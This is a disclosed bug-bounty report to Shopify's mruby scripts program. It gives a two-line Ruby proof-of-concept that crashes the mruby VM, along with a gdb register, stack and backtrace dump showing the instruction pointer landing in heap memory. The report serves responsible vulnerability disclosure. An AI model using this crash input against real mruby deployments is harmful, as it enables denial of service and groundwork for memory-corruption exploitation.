# Segmentation fault on program counter

## Report Details
- **Report ID**: 196498
- **URL**: https://hackerone.com/reports/196498
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-01-07T06:47:57.572Z
- **Disclosed**: 2017-02-05T04:50:47.169Z

## Reporter
- **Username**: icanthack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Mruby running on linux x64
gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)

poc
```
for i in methods Kernel.initialize.public_methods print
print %i[0 0 0 0]end
```
 
output
```
[----------------------------------registers-----------------------------------]
RAX: 0x6b0e00 --> 0x80101
RBX: 0x6bef20 --> 0x6b73d0 --> 0x210
RCX: 0x6ac010 --> 0x7fffffffe0b0 --> 0x0
RDX: 0x8
RSI: 0x6b3830 --> 0x408
RDI: 0x6ac010 --> 0x7fffffffe0b0 --> 0x0
RBP: 0x7fffffffe1a0 --> 0x7fffffffe1f0 --> 0x7fffffffe250 --> 0x7fffffffe3e0 --> 0x7fffffffe410 --> 0x7fffffffe590 (--> ...)
RSP: 0x7fffffffdc18 --> 0x40fdb4 (<mrb_vm_exec+6984>:	mov    QWORD PTR [rbp-0x1d0],rax)
RIP: 0x6b0e00 --> 0x80101
R8 : 0x1
R9 : 0x10
R10: 0x2cb11
R11: 0xf7acd701
R12: 0x401b20 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe670 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6b0dfa:	add    BYTE PTR [rax],al
   0x6b0dfc:	add    BYTE PTR [rax],al
   0x6b0dfe:	add    BYTE PTR [rax],al
=> 0x6b0e00:	add    DWORD PTR [rcx],eax
   0x6b0e02:	or     BYTE PTR [rax],al
   0x6b0e04:	add    BYTE PTR [rax],al
   0x6b0e06:	add    BYTE PTR [rax],al
   0x6b0e08:	(bad)
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc18 --> 0x40fdb4 (<mrb_vm_exec+6984>:	mov    QWORD PTR [rbp-0x1d0],rax)
0008| 0x7fffffffdc20 --> 0x5b00000000 ('')
0016| 0x7fffffffdc28 --> 0x0
0024| 0x7fffffffdc30 --> 0x0
0032| 0x7fffffffdc38 --> 0x48a3f8 --> 0x280c001028040a0
0040| 0x7fffffffdc40 --> 0x6b0e30 --> 0x8040d
0048| 0x7fffffffdc48 --> 0x6ac010 --> 0x7fffffffe0b0 --> 0x0
0056| 0x7fffffffdc50 --> 0x28040a000000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000006b0e00 in ?? ()
gdb-peda$ bt
#0  0x00000000006b0e00 in ?? ()
#1  0x000000000040fdb4 in mrb_vm_exec (mrb=0x6ac010, proc=0x6b0e30, pc=0x48a3f8 <gem_mrblib_irep_mruby_print+328>) at /home/vagrant/mruby/src/vm.c:1174
#2  0x000000000040e26a in mrb_vm_run (mrb=0x6ac010, proc=0x6af150, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:772
#3  0x000000000041627e in mrb_top_run (mrb=0x6ac010, proc=0x6af150, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:2490
#4  0x000000000043bfb4 in mrb_load_exec (mrb=0x6ac010, p=0x7082c0, c=0x706f30) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#5  0x000000000043c04a in mrb_load_file_cxt (mrb=0x6ac010, f=0x707f00, c=0x706f30) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#6  0x00000000004024f8 in main (argc=0x2, argv=0x7fffffffe678) at /home/vagrant/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
#7  0x00007ffff7730f45 in __libc_start_main (main=0x40214f <main>, argc=0x2, argv=0x7fffffffe678, init=<optimized out>, fini=<optimized out>,
    rtld_fini=<optimized out>, stack_end=0x7fffffffe668) at libc-start.c:287
#8  0x0000000000401b49 in _start ()
gdb-peda$

## Attachments
No attachments
